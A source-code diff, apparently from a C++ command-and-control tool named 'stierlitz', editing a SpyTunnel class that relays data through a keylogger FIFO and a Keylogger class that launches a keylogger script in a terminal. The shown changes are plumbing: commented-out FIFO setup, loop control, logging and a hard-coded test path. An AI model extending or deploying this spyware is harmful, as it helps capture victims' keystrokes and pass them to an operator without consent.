@@ -29,7 +29,7 @@ void SpyTunnel::run() {
         _exit(EXIT_FAILURE);
     }
 
-    int tries = 0;
+    /*int tries = 0;
     while ((tunnel_fifo_ = open(KEYLOGGER_FIFO_PATH, O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
         std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
         std::this_thread::sleep_for(std::chrono::milliseconds(200));
@@ -38,7 +38,7 @@ void SpyTunnel::run() {
     if (tunnel_fifo_ == -1) {
         std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
         return;
-    }
+    }*/
     
     ScopedEpollFD epoll_fd;
     epoll_fd.fd = epoll_create1(0);
@@ -79,15 +79,15 @@ void SpyTunnel::run() {
             // Timeout, simulate a test write to the FIFO
             if (tunnel_fifo_ != -1){
                 write(tunnel_fifo_, test, strlen(test));
-                continue;
             }
+            continue;
         }
 
         for (int i=0;i<nfds;i++) {
             if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                 uint64_t u;
                 read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
-
+                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
                 if (tunnel_fifo_ != -1) {
                     write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                     close(tunnel_fifo_);
@@ -120,7 +120,7 @@ void SpyTunnel::write_fifo_error(const std::string& __msg) {
 }
 
 void Keylogger::spawn_window() {
-    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
+    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", "/home/viv4ldi/Desktop/Projects/stierlitz/URXVT/test.py", (char*)NULL);
 }
 
 Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel) {
@@ -129,6 +129,8 @@ Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_sp
     p_spy_tunnel_ = __p_spy_tunnel;
     p_tunnel_shutdown_fd_ = nullptr;
 }
+
+std::atomic<int> Tunnel::active_tunnels_ = 0;
 
 void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, CommandCode __command_code) {
     auto it = std::remove_if(
